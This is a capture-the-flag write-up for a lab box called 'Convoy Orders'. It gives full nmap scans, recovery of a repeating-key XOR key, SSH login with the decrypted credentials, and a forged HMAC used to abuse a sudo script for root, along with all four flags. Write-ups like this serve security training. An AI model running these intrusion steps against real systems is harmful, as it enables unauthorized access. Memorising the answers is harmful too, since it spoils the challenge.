<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Convoy+Orders" alt="Typing SVG" /></a>

</div>

# Convoy Orders — PWN · JID-Pwn302 · Level 5 · 🔴 HARD

- **Status:** ✅ SOLVED (4/4) — full boot2root chain completed.
- **Points:** 2600 / 2600
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 `CTF{...}`)
- **Target:** `10.10.10.32` (lab, over VPN)
- **Attachment:** `orders.bin` (43-byte XOR ciphertext, analyzed locally)
- **Prompt:** *boot2root — the "Convoy crypto" app leaks a crib + ciphertext blob*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2222,8070` | ✅ |
| 2 | Low privilege user | `escort` | ✅ |
| 3 | User flag | `CTF{83f3fc1c90d28ba87037b105934d87c3}` | ✅ |
| 4 | Root flag | `CTF{e61ce069421a3c3aee0024e22c38a48d}` | ✅ |

---

## TL;DR

1. The app on `:8070` ("Convoy crypto") hands you a crib (`JOINT OPERATION ORDER`) and `orders.bin`; crib-drag reveals a 6-byte repeating XOR key `CIVMIL`.
2. Decrypting `orders.bin` yields SSH creds `escort / mile-12` → user flag.
3. Root is a `sudo NOPASSWD` release script whose HMAC gate uses the same leaked key `CIVMIL`; forge the MAC over `RELEASE` and it prints `/root/root.txt`.

9th sibling of the JID boot2root series. Same skeleton (SSH high port `OpenSSH 9.2p1` patched + Python `BaseHTTPServer 0.6` app), but the **foothold is crypto, not a web bug**: the app hands you a crib and a ciphertext blob → repeating-key XOR recovers SSH creds. Privesc is a `sudo` script whose HMAC gate uses the **same leaked key**, so escort forges the MAC and prints `/root/root.txt`.

> Flag format: `CTF{...}`. Every command was executed manually by the user against the box; only `orders.bin` was analyzed locally after download.

---

## 0. Connect
```bash
sudo wg-quick up ./team-71-player-a.conf
```

## Recon — Flag 1: Open TCP ports
```bash
sudo nmap -sS -p- -T4 --max-retries 6 -Pn -n 10.10.10.32 -oN nmap-32-full.txt
sudo nmap -sC -sV -p 2222,8070 -Pn -n 10.10.10.32 -oN nmap-32-svc.txt
```
```
2222/tcp open ssh   OpenSSH 9.2p1 Debian 2+deb12u10   # patched → not the vector
8070/tcp open http  BaseHTTP/0.6 Python/3.11.2        # app "Convoy crypto"
```
**Flag 1 = `2222,8070`** ✅

## Foothold — Flag 2: Low privilege user (crib-drag XOR)
`GET /` ("Convoy crypto") leaks the crib and links the blob:
> *Every order starts with the crib **JOINT OPERATION ORDER**.* → `/orders.bin`
```bash
curl -sS http://10.10.10.32:8070/orders.bin -o orders.bin   # 43 bytes, binary
```
Crib-drag: XOR the ciphertext against the known plaintext at offset 0 → the keystream repeats `CIVMIL` → **6-byte repeating-key XOR**.
```python
ct = open("orders.bin","rb").read()
key = b"CIVMIL"
pt = bytes(c ^ key[i%6] for i,c in enumerate(ct))
# b'JOINT OPERATION ORDER\nssh escort / mile-12\n'
```
Decrypted → **SSH creds `escort` / `mile-12`**.

**Flag 2 (low-priv user) = `escort`** ✅

## User flag — Flag 3
```bash
sshpass -p 'mile-12' ssh -p 2222 escort@10.10.10.32 'cat /home/user.txt'
```
**Flag 3 = `CTF{83f3fc1c90d28ba87037b105934d87c3}`** ✅

## Privesc — Flag 4: Root flag
```
sudo -l → (root) NOPASSWD: /usr/bin/python3 /opt/convoy/release.py
```
`/opt/convoy/release.py` (root-readable, not writable):
```python
import hmac, hashlib
key = b"CIVMIL"
body = open("/home/escort/order.txt").read().encode()
mac  = open("/home/escort/order.mac").read().strip()
good = hmac.new(key, body, hashlib.sha256).hexdigest()
if hmac.compare_digest(mac, good) and body.strip() == b"RELEASE":
    print(open("/root/root.txt").read(), end="")
else:
    print("rejected")
```
Both input files live in `escort`'s home **and the HMAC key `CIVMIL` is the same one leaked in `orders.bin`** → escort forges a valid MAC:
```bash
printf RELEASE > /home/escort/order.txt
python3 -c 'import hmac,hashlib;b=open("/home/escort/order.txt","rb").read();open("/home/escort/order.mac","w").write(hmac.new(b"CIVMIL",b,hashlib.sha256).hexdigest())'
# mac = fecdf0e4d3a612d9bf27c752bcb506996df42e3af6d4855c0bed140ea58499b8
sudo /usr/bin/python3 /opt/convoy/release.py
```
**Flag 4 = `CTF{e61ce069421a3c3aee0024e22c38a48d}`** ✅

---

## Root cause

**Root cause:** one leaked symmetric key (`CIVMIL`) reused for both the foothold cipher and the root release gate — recover it once, own the whole box.
